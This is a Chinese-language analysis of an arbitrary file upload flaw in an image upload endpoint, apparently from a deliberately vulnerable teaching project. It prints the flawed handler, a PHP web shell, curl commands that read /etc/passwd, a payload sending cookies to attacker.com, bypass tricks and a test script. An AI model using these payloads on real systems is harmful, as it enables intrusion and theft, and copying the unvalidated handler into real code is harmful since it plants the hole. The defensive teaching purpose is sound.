# 问题3: 图片上传任意文件上传漏洞 - 详细分析

**文档版本**: 1.0  
**创建日期**: 2026-05-01

---

## 1. 问题描述

图片上传接口存在严重的安全漏洞，攻击者可以上传任意类型的文件，包括Web Shell、恶意脚本等。

**典型场景**:
- 攻击者上传 `shell.php` 文件
- 文件被成功保存到服务器
- 攻击者通过URL访问该文件，执行任意代码
- 服务器被完全控制

---

## 2. 问题代码位置

**文件**: `server/api/vulnerable/upload/image.post.ts:1-61`

```typescript
import formidable from 'formidable';
import fs from 'fs/promises';
import path from 'path';
import { v4 as uuidv4 } from 'uuid';

export default defineEventHandler(async (event) => {
  const user = await requireAuth(event);
  
  const uploadDir = path.join(process.cwd(), 'public', 'uploads');
  
  try {
    await fs.access(uploadDir);
  } catch {
    await fs.mkdir(uploadDir, { recursive: true });
  }
  
  const form = formidable({
    uploadDir,
    keepExtensions: true,
    maxFileSize: 10 * 1024 * 1024,
    filename: (name, ext, part) => {
      const originalName = part.originalFilename || name;
      return `${uuidv4()}_${originalName}`;
    },
  });
  
  return new Promise((resolve, reject) => {
    form.parse(event.node.req, async (err, fields, files) => {
      if (err) {
        reject(createError({
          statusCode: 400,
          message: '文件解析失败: ' + err.message,
        }));
        return;
      }
      
      const file = files.file?.[0] || files.image?.[0];
      
      if (!file) {
        reject(createError({
          statusCode: 400,
          message: '未找到上传的文件',
        }));
        return;
      }
      
      const fileUrl = `/uploads/${path.basename(file.filepath)}`;
      
      resolve({
        success: true,
        data: {
          url: fileUrl,
          filename: file.originalFilename,
          size: file.size,
          mimetype: file.mimetype,
        },
        message: '文件上传成功',
      });
    });
  });
});
```

---

## 3. 根本原因详细分析

### 3.1 缺少文件类型验证

**核心问题**: 代码没有对上传的文件类型进行任何验证。

#### 3.1.1 问题代码分析

```typescript
// ❌ 问题：没有验证文件类型
const file = files.file?.[0] || files.image?.[0];

if (!file) {
  reject(createError({ statusCode: 400, message: '未找到上传的文件' }));
  return;
}

// ❌ 直接保存文件，没有验证类型
const fileUrl = `/uploads/${path.basename(file.filepath)}`;

resolve({
  success: true,
  data: {
    url: fileUrl,
    filename: file.originalFilename,
    size: file.size,
    mimetype: file.mimetype,  // 只是返回，没有验证
  },
  message: '文件上传成功',
});
```

#### 3.1.2 为什么信任客户端MIME类型是危险的

```typescript
// 攻击者可以伪造MIME类型
// 例如：上传 shell.php，但声称是 image/jpeg

// 攻击者的请求：
// curl -X POST http://localhost:3000/api/vulnerable/upload/image \
//   -H "Authorization: Bearer <token>" \
//   -F "file=@shell.php;type=image/jpeg"  // 伪造MIME类型

// 服务端接收：
// file.mimetype = 'image/jpeg' （攻击者伪造）
// file.originalFilename = 'shell.php'
// 但文件内容实际是PHP代码
```

### 3.2 攻击场景分析

#### 3.2.1 场景1: 上传PHP Web Shell

**攻击步骤**:

1. **攻击者准备Web Shell**:
```php
<?php
// shell.php - 简单的Web Shell
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

2. **上传文件**:
```bash
curl -X POST http://target.com/api/vulnerable/upload/image \
  -H "Authorization: Bearer <stolen_token>" \
  -F "file=@shell.php;type=image/jpeg"
```

3. **服务端响应**:
```json
{
  "success": true,
  "data": {
    "url": "/uploads/550e8400-e29b-41d4-a716-446655440000_shell.php",
    "filename": "shell.php",
    "size": 123,
    "mimetype": "image/jpeg"
  },
  "message": "文件上传成功"
}
```

4. **攻击者执行命令**:
```bash
# 访问上传的文件，执行任意命令
curl "http://target.com/uploads/550e8400-e29b-41d4-a716-446655440000_shell.php?cmd=ls -la"

# 获取服务器信息
curl "http://target.com/uploads/..._shell.php?cmd=whoami"
curl "http://target.com/uploads/..._shell.php?cmd=cat /etc/passwd"
```

#### 3.2.2 场景2: 上传XSS脚本

**攻击步骤**:

1. **攻击者准备XSS文件**:
```html
<!-- xss.html -->
<html>
<script>
// 窃取用户Cookie
document.location = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>
</html>
```

2. **上传并访问**:
```bash
curl -X POST http://target.com/api/vulnerable/upload/image \
  -H "Authorization: Bearer <token>" \
  -F "file=@xss.html;type=image/png"
```

3. **诱导用户访问**:
攻击者发送链接给受害者：
```
http://target.com/uploads/..._xss.html
```

4. **用户访问后，Cookie被窃取**

#### 3.2.3 场景3: 双重扩展名绕过

**攻击步骤**:

1. **攻击者准备文件**:
```
文件名: image.jpg.php
MIME类型: image/jpeg
内容: <?php phpinfo(); ?>
```

2. **某些服务器配置下，.php.jpg会被当作PHP执行**:
- Apache配置不当可能会执行这类文件
- Nginx配置不当也可能出现类似问题

3. **即使不被执行，也可能造成其他危害**

### 3.3 漏洞影响矩阵

| 攻击类型 | 影响程度 | 利用难度 | 描述 |
|----------|----------|----------|------|
| PHP Web Shell | **严重** | 低 | 完全控制服务器 |
| ASP/ASPX Shell | **严重** | 低 | Windows服务器控制 |
| JSP Shell | **严重** | 低 | Java服务器控制 |
| Python/Perl脚本 | 高 | 中 | 代码执行 |
| XSS攻击 | 高 | 低 | 窃取用户凭证 |
| 可执行文件上传 | 高 | 中 | 后续利用 |
| 病毒/木马 | 中 | 中 | 传播恶意软件 |

### 3.4 常见绕过技术

#### 3.4.1 MIME类型欺骗

```bash
# 攻击者可以设置任意MIME类型
curl -X POST http://target.com/api/upload \
  -F "file=@shell.php;type=image/jpeg"       # 声称是JPEG
  -F "file=@shell.php;type=image/png"        # 声称是PNG
  -F "file=@shell.php;type=application/pdf"  # 声称是PDF
```

#### 3.4.2 空字节注入

```bash
# 某些系统会在空字节处截断文件名
curl -X POST http://target.com/api/upload \
  -F "file=@shell.php;filename=shell.php%00.jpg;type=image/jpeg"

# 服务端可能保存为: shell.php （在%00处截断）
```

#### 3.4.3 内容伪造

```
文件: fake.jpg
MIME: image/jpeg
扩展名: .jpg
内容: <?php phpinfo(); ?> （不是真正的JPEG内容）

如果只验证扩展名和MIME，会被绕过
但如果验证文件内容（魔数），会被拒绝
```

---

## 4. 问题复现步骤

### 4.1 环境准备

1. **启动目标服务器**:
```bash
cd server-backend
npm run dev
```

2. **获取有效Token**:
```bash
# 先登录获取token
curl -X POST http://localhost:3000/api/vulnerable/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"testpass"}'
```

### 4.2 攻击脚本

```bash
#!/bin/bash
# file-upload-attack-test.sh

TARGET_URL="http://localhost:3000"
TOKEN="your-valid-jwt-token-here"

echo "=== 文件上传漏洞测试 ==="

# 测试1: 上传PHP Web Shell
echo -e "\n1. 测试上传PHP文件..."
echo '<?php echo "Vulnerable! " . phpinfo(); ?>' > /tmp/shell.php

curl -X POST "$TARGET_URL/api/vulnerable/upload/image" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/shell.php;type=image/jpeg"

# 测试2: 上传HTML XSS
echo -e "\n2. 测试上传HTML文件..."
echo '<html><script>alert("XSS")</script></html>' > /tmp/xss.html

curl -X POST "$TARGET_URL/api/vulnerable/upload/image" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/xss.html;type=image/png"

# 测试3: 双重扩展名
echo -e "\n3. 测试双重扩展名..."
echo '<?php echo "Double extension test"; ?>' > /tmp/image.jpg.php

curl -X POST "$TARGET_URL/api/vulnerable/upload/image" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/image.jpg.php;type=image/jpeg"

echo -e "\n=== 测试完成 ==="
echo "如果以上请求都返回 '文件上传成功'，说明存在严重漏洞！"
```

### 4.3 预期结果

运行攻击脚本后，如果看到以下输出，说明存在漏洞：

```
=== 文件上传漏洞测试 ===

1. 测试上传PHP文件...
{"success":true,"data":{"url":"/uploads/..._shell.php",...},"message":"文件上传成功"}

2. 测试上传HTML文件...
{"success":true,"data":{"url":"/uploads/..._xss.html",...},"message":"文件上传成功"}

3. 测试双重扩展名...
{"success":true,"data":{"url":"/uploads/..._image.jpg.php",...},"message":"文件上传成功"}

=== 测试完成 ===
如果以上请求都返回 '文件上传成功'，说明存在严重漏洞！
```

---

## 5. 根本原因总结

| 问题层级 | 具体问题 | 根本原因 |
|----------|----------|----------|
| **业务逻辑** | 没有文件类型验证 | 开发者假设用户只会上传图片 |
| **安全意识** | 信任客户端输入 | MIME类型、文件名完全由客户端控制 |
| **验证缺失** | 只有大小限制 | 缺少类型、内容、扩展名验证 |
| **架构设计** | 上传目录权限不当 | 上传文件可能被执行 |

### 5.1 核心问题

1. **无白名单验证**:
   - 没有定义允许的文件类型列表
   - 任何文件都可以上传

2. **信任客户端数据**:
   - `file.mimetype` 完全由客户端控制
   - 攻击者可以伪造任何MIME类型

3. **缺少内容验证**:
   - 没有验证文件实际内容
   - 内容伪造攻击无法检测

4. **文件名不安全**:
   - 虽然使用了UUID，但保留了原始扩展名
   - 危险扩展名（.php, .asp等）没有被过滤

---

## 6. 相关代码文件

| 文件路径 | 问题类型 | 状态 |
|----------|----------|------|
| `server/api/vulnerable/upload/image.post.ts` | 无文件类型验证 | ❌ 有问题 |
| `server/api/fixed/upload/image.post.ts` | 已修复（三重验证） | ✅ 修复 |
| `server/utils/file-upload.ts` | 文件上传安全工具类 | ✅ 新增 |
